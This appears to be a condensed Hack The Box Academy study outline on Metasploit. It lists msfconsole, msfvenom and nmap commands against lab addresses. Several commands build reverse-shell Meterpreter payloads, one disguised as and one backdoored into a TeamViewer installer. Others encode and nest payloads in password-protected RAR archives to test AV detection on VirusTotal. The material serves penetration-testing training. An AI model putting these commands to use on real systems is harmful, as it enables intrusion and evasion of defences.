...
- [Introduction to Metasploit](#introduction-to-metasploit)
  ...
  - [Understanding the Architecture](#understanding-the-architecture)
      ...
      - [Scripts](#scripts)
      - [Tools](#tools)
- [Introduction to MSFconsole](#introduction-to-msfconsole)
...
- [Modules](#modules-1)
  ...
  - [Searching for Modules](#searching-for-modules)
      - [MSF - Search Function](#msf---search-function)
      - [MSF - Searching for EternalRomance](#msf---searching-for-eternalromance)
      - [MSF - Specific Search](#msf---specific-search)
  - [Module Selection](#module-selection)
      - [MSF - Search for MS17\_010](#msf---search-for-ms17_010)
  - [Using Modules](#using-modules)
      - [MSF - Select Module](#msf---select-module)
      - [MSF - Module Information](#msf---module-information)
      - [MSF - Target Specification](#msf---target-specification)
      - [MSF - Permanent Target Specification](#msf---permanent-target-specification)
      - [MSF - LHOST Specification](#msf---lhost-specification)
      - [MSF - Exploit Execution](#msf---exploit-execution)
      - [MSF - Target Interaction](#msf---target-interaction)
- [Targets](#targets)
...
- [Payloads](#payloads)
  ...
  - [Searching for Payloads](#searching-for-payloads)
      - [MSF - List Payloads](#msf---list-payloads)
      - [MSF - Searching for Specific Payload](#msf---searching-for-specific-payload)
  - [Selecting Payloads](#selecting-payloads)
      - [MSF - Select Payload](#msf---select-payload)
  - [Using Payloads](#using-payloads)
      - [MSF - Exploit and Payload Configuration](#msf---exploit-and-payload-configuration)
      - [MSF - Meterpreter Commands](#msf---meterpreter-commands)
      - [MSF - Meterpreter Navigation](#msf---meterpreter-navigation)
      - [MSF - Windows CMD](#msf---windows-cmd)
...
- [Sessions](#sessions)
  ...
  - [Jobs](#jobs)
      - [Viewing the Jobs Command Help Menu](#viewing-the-jobs-command-help-menu)
...
- [Meterpreter](#meterpreter)
  - [Running Meterpreter](#running-meterpreter)
      - [MSF - Meterpreter Commands](#msf---meterpreter-commands-1)
  - [Stealthy](#stealthy)
  - [Powerful](#powerful)
...
- [Writing and Importing Modules](#writing-and-importing-modules)
  ...
  - [Writing Our Module](#writing-our-module)
      - [Proof-of-Concept - Requirements](#proof-of-concept---requirements)
      - [Proof-of-Concept - Module Information](#proof-of-concept---module-information)
      - [Proof-of-Concept - Functions](#proof-of-concept---functions)
...
- [Firewall and IDS/IPS Evasion](#firewall-and-idsips-evasion)
  ...
  - [A Note on Evasion](#a-note-on-evasion)
- [Metasploit-Framework Updates - August 2020](#metasploit-framework-updates---august-2020)
  - [Generation Features](#generation-features)
  - [Expanded Encryption](#expanded-encryption)
  - [Cleaner Payload Artifacts](#cleaner-payload-artifacts)
  - [Plugins](#plugins-2)
  - [Payloads](#payloads-1)
...
```bash
Miituberss@htb[/htb]$ ls /usr/share/metasploit-framework/modules
...
```bash
Miituberss@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/
...
```bash
Miituberss@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/
...
```bash
Miituberss@htb[/htb]$ ls /usr/share/metasploit-framework/tools/
...
```bash
Miituberss@htb[/htb]$ msfconsole -q
...
```bash
Miituberss@htb[/htb]$ sudo apt update && sudo apt install metasploit-framework
...
```bash
Miituberss@htb[/htb]$ nmap -sV 10.10.10.40
...
```bash
Miituberss@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
...
```bash
Miituberss@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
...
```bash
Miituberss@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
...
```bash
Miituberss@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
...
```bash
Miituberss@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
...
```bash
Miituberss@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe
...
```bash
Miituberss@htb[/htb]$ sudo service postgresql status
...
```bash
Miituberss@htb[/htb]$ sudo systemctl start postgresql
```
...
```bash
Miituberss@htb[/htb]$ sudo msfdb init
...
```bash
Miituberss@htb[/htb]$ sudo msfdb status
...
```bash
Miituberss@htb[/htb]$ sudo msfdb run
...
```bash
Miituberss@htb[/htb]$ msfdb reinit
Miituberss@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
Miituberss@htb[/htb]$ sudo service postgresql restart
Miituberss@htb[/htb]$ msfconsole -q
...
```bash
Miituberss@htb[/htb]$ cat Target.nmap
...
```bash
Miituberss@htb[/htb]$ git clone https://github.com/darkoperator/Metasploit-Plugins
Miituberss@htb[/htb]$ ls Metasploit-Plugins
...
```bash
Miituberss@htb[/htb]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```
...
```bash
Miituberss@htb[/htb]$ searchsploit nagios3
...
```bash
Miituberss@htb[/htb]$ searchsploit -t Nagios3 --exclude=".py"
...
```bash
Miituberss@htb[/htb]$ ls /usr/share/metasploit-framework/
...
```bash
Miituberss@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
Miituberss@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
```
...
```bash
Miituberss@htb[/htb]$ ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit
...
```bash
Miituberss@htb[/htb]$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
```
...
If we want to find the appropriate mixins, classes, and methods required for our module to work, we will need to look up the different entries on the [Metasploit Documentation](https://docs.metasploit.com/api/).
...
All necessary information about Metasploit Ruby coding can be found on the [Metasploit Documentation](https://docs.metasploit.com/api/) related page. From scanners to other auxiliary tools, from custom-made exploits to ported ones, coding in Ruby for the Framework is an amazingly applicable skill.
...
```bash
Miituberss@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5
...
```bash
Miituberss@htb[/htb]$ ftp 10.10.10.5
...
```bash
Miituberss@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
...
```bash
Miituberss@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
...
```bash
Miituberss@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
...
```bash
Miituberss@htb[/htb]$ cat test.js
...
```bash
Miituberss@htb[/htb]$ msf-virustotal -k <API key> -f test.js 
...
```bash
Miituberss@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
Miituberss@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
Miituberss@htb[/htb]$ rar a ~/test.rar -p ~/test.js
...
```bash
Miituberss@htb[/htb]$ mv test.rar test
Miituberss@htb[/htb]$ ls
...
```bash
Miituberss@htb[/htb]$ rar a test2.rar -p test
...
```bash
Miituberss@htb[/htb]$ mv test2.rar test2
Miituberss@htb[/htb]$ ls
...
```bash
Miituberss@htb[/htb]$ msf-virustotal -k <API key> -f test2
